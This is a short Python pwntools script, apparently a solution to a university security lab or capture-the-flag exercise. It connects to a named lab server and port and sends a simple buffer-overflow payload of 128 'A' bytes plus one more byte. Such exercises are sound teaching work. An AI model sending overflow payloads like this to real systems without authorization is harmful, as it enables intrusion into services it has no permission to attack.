from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23151

s = remote(SERVER, PORT, timeout=9999)

payload = b"A" * 128 + b"b"

s.sendline(payload)

print(s.recvall())